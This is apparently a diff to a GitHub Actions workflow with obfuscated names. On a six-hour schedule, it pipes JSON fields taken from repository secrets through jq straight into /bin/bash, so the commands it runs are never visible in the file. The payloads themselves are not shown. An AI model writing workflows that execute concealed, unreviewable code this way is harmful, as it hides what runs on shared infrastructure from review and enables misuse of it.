@@ -1,9 +1,8 @@
 name: zhaojinan7890
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 5/6 * * *'
+    - cron: '2 1/6 * * *'
 
 jobs:
   build:
@@ -13,11 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhaojinan7890
         env:
-          yog5: ${{ secrets.yog5 }}
+          p3301: ${{ secrets.p3301 }}
         run: |
-          echo $yog5 | jq -r .hvk9 | /bin/bash
-          echo $dq12 | jq -r .ll98 | /bin/bash
-          echo $j72109 | jq -r .xrduu61828 | /bin/bash
-          echo $kmped270 | jq -r .ty676 | /bin/bash
-          echo $f26 | jq -r .lfk23643 | /bin/bash
+          echo $p3301 | jq -r .eiyq886 | /bin/bash
+          echo $glkl967 | jq -r .iy7650 | /bin/bash
+          echo $qwgr50541 | jq -r .s46157 | /bin/bash
+          echo $slvec01 | jq -r .jm160 | /bin/bash
+          echo $jd34183 | jq -r .dydf32585 | /bin/bash
+          echo $empo6499 | jq -r .e4 | /bin/bash
+          echo $qm47784 | jq -r .txmdb78738 | /bin/bash
 
